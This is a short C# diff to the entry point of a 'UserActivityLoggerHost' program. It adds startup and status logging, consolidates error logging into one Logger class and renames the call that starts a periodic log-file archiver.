@@ -16,19 +16,24 @@ namespace Host
         static string _archiveLocation;
         static void Main(string[] args)
         {
+            Logger.LogInforamtion("Started");
+
             if (SingleInstance.IsApplicationAlreadyRunning("UserActivityLoggerHost"))
             {
+                Logger.LogInforamtion("Already Running");
                 return;
             }
 
 
             if (args.Length > 0 && args[0] == "hidden")
             {
+                Logger.LogInforamtion("Running with hidden");
+
                 _localLogFolder = Path.Combine(GetRootFolderPath(), "SysLogs");
 
-                new UnhandledExceptionHandlercs().Register(ErrrorLogger.LogError);
+                new UnhandledExceptionHandlercs().Register(Logger.LogError);
 
-                new LogFileArchiver(GetFileSystem(), _archiveLocation).StartPurging(_localLogFolder, TimeSpan.FromMinutes(5));
+                new LogFileArchiver(GetFileSystem(), _archiveLocation).Start(_localLogFolder, TimeSpan.FromMinutes(5));
 
                 //new LogFileArchiver(GetFileSystem(), _archiveLocation).StartPurging(_logFolder, TimeSpan.FromSeconds(5));
 
